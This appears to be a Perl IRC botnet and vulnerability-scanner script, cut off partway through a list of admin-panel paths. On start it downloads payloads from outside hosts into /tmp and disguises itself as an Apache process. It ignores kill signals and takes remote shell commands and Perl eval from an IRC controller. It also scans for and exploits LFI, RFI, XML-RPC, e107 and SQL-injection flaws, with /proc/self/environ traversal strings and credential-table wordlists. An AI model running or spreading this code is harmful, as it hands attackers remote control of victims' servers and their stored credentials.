#!/usr/bin/perl
$powered="justice";
$mail="faldy_justice(at)muslim.com";
#########################################################	
#    __ _  ___   _____/  |___  _  _____________|  | __ 
#   / _` |/   \_/ __ \   __\ \/ \/ /  _ \_  __ \  |/ / 
#  | (_| |  |  \  ___/|  |  \     (  <_> )  | \/    <  
#   \__, |__|  /\___  >__|   \/\_/ \____/|__|  |__|_ \ 
#   |___/           \/               \/             \/ 
#														#
#########################################################  
use HTTP::Request;                             #
use HTTP::Request::Common;                     #
use HTTP::Request::Common qw(POST);            #
use LWP::Simple;                               #
use LWP 5.64;                                  #
use LWP::UserAgent;                            #
use Socket;                                    #
use IO::Socket;                                #
use IO::Socket::INET;                          #
use IO::Select;                                #
use MIME::Base64;			       			   #
################################################

my $datetime = localtime;

my $fakeproc  	= "/usr/sbin/apache2 -k start"; 
my $ircserver   = $ARGV[0] unless $ircserver;
my $ircport   	= "6667";
my $nickname  	= "Scan[^_^][".int(rand(100))."]";
my $ident     	= "ee";
my $channel   	= '#'.$ARGV[4];
my $admin    	= "cow_revo";
my $fullname  	= "15,1(0+8scanner0+15)";

######################################################
my $nob0dy    = "15,1(0+8gHACK0+15)";
my $lfilogo   = "15,1(0+8LFI0+15)";
my $rfilogo   = "15,1(0+8RFI0+15)";
my $e107logo  = "15,1(0+8e1070+15)";
my $xmllogo   = "15,1(0+8XML0+15)";
my $sqllogo   = "15,1(0+8SQL0+15)";
my $oscologo  = "15,1(0+8osCO0+15)";
my $zenlogo   = "15,1(0+8ZEN0+15)";
my $oplogo    = "15,1(0+8OP-Chart0+15)";
my $admlogo   = "15,1(0+8pHpMyAdmin0+15)";
my $thumblogo = "15,1(0+8Thumb0+15)";
my $zerologo  = "15,1(0+8Zboard0+15)";
my $smslogo   = "15,1(0+8sms0+15)";
my $ossqllogo   = "15,1(0+8Os-SQL0+15)";
my $e107logosql = "15,1(0+8e107-SQL0+15)";
my $spreadlogo = "15,1(0+8Spread0+15)";
######################################################
my $lficmd    = '!lfi';
my $rficmd    = '!rfi';
my $e107cmd   = '!e107';
my $xmlcmd    = '!xml';
my $sqlcmd    = '!sql';
my $oscocmd   = '!osco';
my $zencmd    = '!zen';
my $admcmd    = '!adm';
my $opcmd     = '!op';
my $ossqlcmd  = '!osco2';
my $esqlcmd   = '!sqle';
my $thumbcmd  = '!tim';
my $zboardcmd = '!zboard';	
my $cmdlfi    = '!cmdlfi';
my $cmde107   = '!cmde107';
my $cmdxml    = '!cmdxml';
my $injector  = "http://www.envioneer.com/board//data/notice/1194741991/tid.gif";
my $botshell  = "http://www.envioneer.com/board//data/notice/1194741991/byroe.jpg";
my $botshell2  = "http://www.envioneer.com/board//data/notice/1194741991/allnet.jpg";
my @uagents   = ("Microsoft Internet Explorer/4.0b1 (Windows 95)","Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)","Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)","Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)","Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)","Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)","Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)","Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)","Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)","Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)","Mozilla/4.0 (compatible; MSIE 7.0b; Win32)","Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)","Microsoft Pocket Internet Explorer/0.6","Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)","MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;","Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)","Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)","Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)","Advanced Browser (http://www.avantbrowser.com)","Avant Browser (http://www.avantbrowser.com)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)","Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)","Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)","Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511","Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929","Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0","Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox","Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6","Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7","Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4","Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4","Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1","Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1","Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1","Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2","Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b","Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0","Mozilla/3.0 (OS/2; U)","Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)","Mozilla/4.61 (Macintosh; I; PPC)","Mozilla/4.61 [en] (OS/2; U)","Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)","Mozilla/4.8 [en] (Windows NT 5.0; U)");
my $uagent    = $uagents[rand(scalar(@uagents))];
my $lfdtest   = "../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%00";
my $open_test = "/admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html";
my $adm_output = ("uid=");
my $open_output = ("FCKeditor - Connectors Tests");

my @tabele		= ('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario',
					'name','names','nombre','nombres','usuarios','member','members','admin_table','miembro','miembros','membername','admins','administrator',
					'administrators','passwd','password','passwords','pass','Pass','tAdmin','tadmin','user_password','user_passwords','user_name','user_names',
					'member_password','mods','mod','moderators','moderator','user_email','user_emails','user_mail','user_mails','mail','emails','email','address',
					'e-mail','emailaddress','correo','correos','phpbb_users','log','logins','login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass',
					'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador','tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id',
					'sistema_usuario','sistema_password','contrasena','auth','key','senha','tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member',
					'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization','membros','utilizadores','staff','nuke_authors','accounts','account','accnts',
					'associated','accnt','customers','customer','membres','administrateur','utilisateur','tuser','tusers','utilisateurs','password','amministratore','god','God','authors',
					'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members','Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');
my @kolumny		= ('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',
					'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',
					'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author',
					'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',
					'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',
					'user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password','autor','upassword','web_password','web_username');
$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';
my $success   	= "\n [+] sibego scanner\n [-] Running Successfully ...\n [-] Process/PID : $fakeproc - $$\n";
my $failed    	= "\n [-] perl $0 <host> <port> <botnick> <botident> <channel> <runner>\n\n";
if (@ARGV != 6) { print $failed; exit(); } else { print $success; }
chdir("/tmp");
chop (my $priper = `wget http://www.envioneer.com/board//data/notice/1194741991/tid.gif -O linux.jpg;wget http://www.envioneer.com/board//data/notice/1194741991/tid.gif -O centos.jpg;wget http://www.envioneer.com/board//data/notice/1194741991/byroe.jpg -O input.jpg;wget http://www.envioneer.com/board//data/notice/1194741991/allnet.jpg -O output.jpg;wget http://hr-africa.com/images/banners/zero/mysql.jpg -O mysql.jpg`);
$ircserver = "$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0" x 16;;
&SIGN();
my $pid = fork;
exit if $pid;
die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}

sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
		$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        my $versi   = "15,1(0+8empixcrew0+15)";
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$versi");
        sleep (1);}}
sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    }
    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick("$mynick".int rand(1));
    }
    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sendraw("MODE $mynick +Bx");
        sendraw("JOIN $channel");
        sleep(2);
        sendraw("PRIVMSG $admin :Hi $admin im here !!!");
    }
}
my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { &connector("$nickname", "$ircserver", "$ircport"); }
    select(undef, undef, undef, 0.01);;
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $ircmsg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $ircmsg);
        $ircmsg =~ s/\r\n$//;

        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);
			my $engine ="GooGLe,ReDiff,Bing,ALtaViSTa,AsK,UoL,CluSty,GutSer,GooGle2,ExaLead,VirgiLio,WebDe,AoL,SaPo,DuCk,YauSe,BaiDu,KiPoT,GiBLa,YahOo,HotBot,LyCos,LyGo,BLacK,oNeT,SiZuka,WaLLa,DeMos,RoSe,SeZnaM,TisCali,NaVeR";
            if ($path eq $mynick) {
                if ($msg =~ /^PING (.*)/) {
                    sendraw("NOTICE $nick :PING $1");
                }
                if ($msg =~ /^VERSION/) {
                    sendraw("NOTICE $nick :VERSION mIRC v6.17 Khaled Mardam-Bey");
                }
                if ($msg =~ /^TIME/) {
                    sendraw("NOTICE $nick :TIME ".$datetime."");
                }
                if (&isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {
                    sendraw("NICK ".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    sendraw($IRC_cur_socket, "PRIVMSG $nick :9,1Fake Process/PID : $fakeproc - $$");
                }
                if (&isAdmin($nick) && $msg !~ /^!/) {
                    &shell("$nick","$msg");
                }
 				if (&isAdmin($nick) && $msg=~ /^$cmdlfi\s+(.*?)\s+(.*)/){
					my $url = $1.$lfdtest;
					my $cmd = $2;
					&cmdlfi($url,$cmd,$nick);
				}
				if (&isAdmin($nick) && $msg=~ /^$cmdxml\s+(.*?)\s+(.*)/){
					my $url = $1;
					my $cmd = $2;
					&cmdxml($url,$cmd,$nick);
				}
				if (&isAdmin($nick) && $msg=~ /^$cmde107\s+(.*?)\s+(.*)/){
					my $url = $1;
					my $cmd = $2;
					&cmde107($url,$cmd,$nick);
				}
           }
            else {
                if (&isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg eq "!part") {
                    sendraw("PART $path");
                }
                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^\.sh (.*)/) {
                    &shell("$path","$1");
                }
                if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {
                    &shell("$path","$1");
                }
				if (&isAdmin($nick) && $msg =~ /^!eval (.*)/) {
				eval "$1";
				}
				##################################################################### HIT

				if ($msg=~ /^$cmdlfi\s+(.+?)\s+(.*)/){
					my $url = $1.$lfdtest;
					my $cmd = $2;
					&cmdlfi($url,$cmd,$path);
				}
				if ($msg=~ /^$cmdxml\s+(.+?)\s+(.*)/){
					my $url = $1;
					my $cmd = $2;
					&cmdxml($url,$cmd,$path);
				}
				if ($msg=~ /^$cmde107\s+(.+?)\s+(.*)/){
					my $url = $1;
					my $cmd = $2;
					&cmde107($url,$cmd,$path);
				}
				
				##################################################################### SMS
				if ($msg=~ /^!sms\s+(.*?)\s+(.*)/){		
					my $no    = $1;    
					my $pesan = $2;
					if(sendSMS($no,$pesan)){
						&msg("$path","$smslogo 9,1Sukses mengirim ke 4 ".$no."9 Pengirim : 4 ".$nick);
					}
					else {
						&msg("$path","$smslogo 4,1 GAGAL!!");
					}
				}	

                ##################################################################### HELP COMMAND

                if ($msg=~ /^!help/) {
                    my $helplogo = "15,1(0+8Help15)";
                    &msg("$path","|$helplogo 4 ++++++++++8 SCANNER 4+++++++++  $helplogo |");
                    &msg("$path","|$helplogo 4 +8 $rficmd    <bug>  <dork>    4+  $helplogo |");
                    &msg("$path","|$helplogo 4 +8 $lficmd    <bug>  <dork>    4+  $helplogo |");
                    &msg("$path","|$helplogo 4 +8 $xmlcmd    <bug>  <dork>    4+  $helplogo |");
                    &msg("$path","|$helplogo 4 +8 $sqlcmd    <bug>  <dork>    4+  $helplogo |");
                    &msg("$path","|$helplogo 4 +8 $e107cmd   <dork>           4+  $helplogo |");
                    &msg("$path","|$helplogo 4 +8 $oscocmd   <dork>           4+  $helplogo |");
					&msg("$path","|$helplogo 4 +8 $zencmd    <dork>           4+  $helplogo |");
					&msg("$path","|$helplogo 4 +8 $opcmd     <dork>           4+  $helplogo |");
					&msg("$path","|$helplogo 4 +8 $admcmd    <dork>           4+  $helplogo |");
					&msg("$path","|$helplogo 4 +8 $thumbcmd  <bug>  <dork>    4+  $helplogo |");
					&msg("$path","|$helplogo 4 +8 $zboardcmd <bug>  <dork>    4+  $helplogo |");
                    &msg("$path","|$helplogo 4 ++++++++++8 EXECUTE 4+++++++++  $helplogo |");
                    &msg("$path","|$helplogo 4 +8 $cmdlfi  <target> <cmd>  4+  $helplogo |");
                    &msg("$path","|$helplogo 4 +8 $cmdxml  <target> <cmd>  4+  $helplogo |");
                    &msg("$path","|$helplogo 4 +8 $cmde107 <target> <cmd>  4+  $helplogo |");
                    &msg("$path","|$helplogo 4 ++++++++++8  E N D  4+++++++++  $helplogo |");
                }
                if ($msg=~ /^!engine/) {
                    my $enginelogo = "15,1(0+8EnginE15)";
                    &msg("$path","|$enginelogo 8 GooGLe,ReDiff,Bing,ALtaViSTa,AsK,UoL,CluSty,GutSer,GooGle2,ExaLead|");
                    &msg("$path","|$enginelogo 8 WebDe,AoL,SaPo,DuCk,YauSe,BaiDu,KiPoT,GiBLa,YahOo,HotBot,LyCos,LyGo|");
                    &msg("$path","|$enginelogo 8 BLacK,oNeT,SiZuka,WaLLa,DeMos,RoSe,SeZnaM,TisCali,NaVeR,Virgilio|");
                }
                if ($msg=~ /^!about/) {
                    my $aboutlogo = "15,1(0+8About15)";
                    &msg("$path","|$aboutlogo 8anakbego Scanner Modify By sibego $aboutlogo|");
                }
                if ($msg=~ /^!version/) {
                    my $versionlogo = "15,1(0+8Version15)";
                    &msg("$path","|$versionlogo 13private Edited $versionlogo|");
                }
                if ($msg=~ /^!respon/ || $msg=~ /^!id/) {
                    if (&isFound($injector,"ipays")) {
                        &msg("$path","|15,1(0+8Injector15)13 ScanneR 9READY!!!|");
                    } else {
                        &msg("$path","|15,1(0+8Injector15)13 ScanneR 4NOT READY!!!|");
                    }
                }
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    &notice("$nick","9,1Fake Process/PID : 8$fakeproc - $$");
                }
				##################################################################### TOOLS
				if ($msg=~ /^!proxy\s+(.+)/){
					if (my $pid = fork) { waitpid($pid, 0); } else {
						if (fork) { exit; } else {
						my $minta = $1;
                    &msg("$path","|15,1(0+8PROXY15)13 Checking Proxy..|");
					&proxy($path,$minta);
						}
						exit;
					}
				}

                                if ($msg=~ /^!dns\s+(.*)/){ 
		                       my $nsku = $1;
		                       $mydns = inet_ntoa(inet_aton($nsku));
		                       &msg("$path", "|15,1(0+8DNS15) 13$nsku 9Resolve Ke 4 $mydns |");   
	                        }

				if ($msg=~ /^!port\s+(.*?)\s+(.*)/ ) {
					my $hostip= "$1";
					my $portsc= "$2";
					my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $portsc, Proto =>'tcp', Timeout => 7);
					if ($scansock) {
                    &msg("$path","|15,1(0+8PORT15)7 $hostip : $portsc 9Accepted|");
					}
					else {
                    &msg("$path","|15,1(0+8PORT15)7 $hostip : $portsc 4connection refused|");
					}
				}

				if ($msg=~ /^!ip\s+(.*)/ ) {
					if (my $pid = fork) { waitpid($pid, 0); } else {
						if (fork) { exit; } else {
							my $ip = $1;
							&msg("$path","|15,1(0+9IP15)6 Searching ".$ip." 9Location ...|");
							my $website = "http://www.ipligence.com/geolocation";
							my ($useragent,$request,$response,%form);
							undef %form;
							$form{ip}  = $ip;
							$useragent = LWP::UserAgent->new;
							$useragent->timeout(5);
							$request   = POST $website,\%form;
							$response  = $useragent->request($request);
							if ($response->is_success) {
							my $res = $response->content;
								if ($res =~ m/Your IP address is(.*)<br>City:(.*)<br\/>Country:(.*)<br>Continent:(.*)<br>Time/g) {
								my ($ipaddress,$city,$country,$continent) = ($1,$2,$3,$4);
								&msg("$path","|15,1(0+8IP15)13 IP Address : ".$ip." 8 ( ".$ipaddress." )|");
								&msg("$path","|15,1(0+8IP15)13 City       : ".$ip." 8 ( ".$city." )|");
								&msg("$path","|15,1(0+8IP15)13 Country    : ".$ip." 8 ( ".$country." )|");
								&msg("$path","|15,1(0+8IP15)13 Continent  : ".$ip." 8 ( ".$continent." )|");
								}
								else { 
								&msg("$path","|15,1(0+8IP15)13 ".$ip." 4not found in database|");
								}
							}
							else {
							&msg("$path","|15,1(0+8IP15)4 Cannot open IP database|");
							}
						}
						exit;
					}
				}

				if ($msg=~ /^!base64 (.*)$/ ) {
					if (my $pid = fork) { waitpid($pid, 0); } else {
						if (fork) { exit; } else {
						my $hash      = $1;
						my $base64_encoded = encode_base64($hash);
						my $base64_decoded = decode_base64($hash);
						&msg("$path","|15,1(4@9BASE6415)13 Decode : 9$base64_decoded |");
						&msg("$path","|15,1(4@9BASE6415)13 Encode : 9$base64_encoded |");
						}
						exit;
					}
				}
 
                               if ($msg =~ /^!portscan (.*)$/ ) {
                                   my $hostip="$1"; 
                                   my @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
                                   my (@aberta, %porta_banner);
                                   &msg("$path","|15,1(0+8PORTSCAN15) 13Loading port scanner|");
                                   foreach my $porta (@portas)  {
                                   my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
                                   if ($scansock) {
                                   push (@aberta, $porta);
                                   $scansock->close;
                                   }
                                 }
  
                                   if (@aberta) {
                                   &msg("$path", "|15,1(0+8portscan15)13 open ports are...:5 @aberta |");
                                   } else {
                                   &msg("$path","|15,1(0+8portscan15)4 all ports are closed|");
                                   }
                                 }

                                if ($msg=~ /^!login (.*)$/ ) {
					if (my $pid = fork) { waitpid($pid, 0); } else {
						if (fork) { exit; } else {
						my $test = $1 ;
						@index = ('/admin/','/ADMIN/','/login/','/adm/','/cms/','/administrator/','/admin/login.php','/ADMIN/login.php','/admin/home.php','/admin/controlpanel.html','/admin/controlpanel.php','/admin.php','/admin.html','/admin/cp.php','/admin/cp.html','/cp.php','/cp.html','/controlpanel/','/panelc/','/administrator/index.php','/administrator/login.html','/administrator/login.php','/administrator/account.html','/administrator/account.php','/administrator.php','/administrator.html','/login.php','/login.html','/controlpanel/','/administration/','/administration.php','/administration.html','/phpmyadmin/','/myadmin/','/wp-admin/','/webadmin/','/webadmin.php','/webadmin.html','/admins/','/admins.php','/admins.html','/WebAdmin/','/admin1/','/panel/','/cpanel/','/cPanel/','/members/','/wp-login/','/admin/','/ADMIN/','/login/','/adm/','/cms/','/administrator/','/admin/login.php','/ADMIN/login.php','/admin/home.php','/admin/controlpanel.html','/admin/controlpanel.php','/admin.php','/admin.html','/admin/cp.php','/admin/cp.html','/cp.php','/cp.html','/controlpanel/','/panelc/','/administrator/index.php','/administrator/login.html','/administrator/login.php','/administrator/account.html','/administrator/account.php','/administrator.php','/administrator.html','/login.php','/login.html','/controlpanel/','/administration/','/administration.php','/administration.html','/phpmyadmin/','/myadmin/','/wp-admin/','/webadmin/','/webadmin.php','/webadmin.html','/admins/','/admins.php','/admins.html','/WebAdmin/','/admin1/','/panel/','/cpanel/','/cPanel/','/members/','/wp-login/','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php','admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html','admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html','admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html','webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html','admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php','administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html','panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php','adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php','modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','admin1.php','admin1.html','admin2.php','admin2.html','yonetim.php','yonetim.html','yonetici.php','yonetici.html','ccms/','ccms/login.php','ccms/index.php','maintenance/','webmaster/','adm/','configuration/','configure/','websvn/','admin/','admin/account.php','admin/account.html'. 'admin/index.php','admin/index.html','admin/login.php'. 'admin/login.html','admin/home.php','admin/controlpanel.html','admin/controlpanel.php','admin.php','admin.html','admin/cp.php','admin/cp.html','cp.php','cp.html','administrator/','administrator/index.html','administrator/index.php','administrator/login.html','administrator/login.php','administrator/account.html','administrator/account.php','administrator.php','administrator.html','login.php','login.html','modelsearch/login.php','moderator.php','moderator.html','moderator/login.php','moderator/login.html','moderator/admin.php','moderator/admin.html','moderator/','account.php','account.html','controlpanel/','controlpanel.php','controlpanel.html','admincontrol.php','admincontrol.html','adminpanel.php','adminpanel.html','admin1.asp','admin2.asp','yonetim.asp','yonetici.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/home.asp','admin/controlpanel.asp','admin.asp','admin/cp.asp','cp.asp','administrator/index.asp','administrator/login.asp','administrator/account.asp','administrator.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','moderator/admin.asp','account.asp','controlpanel.asp','admincontrol.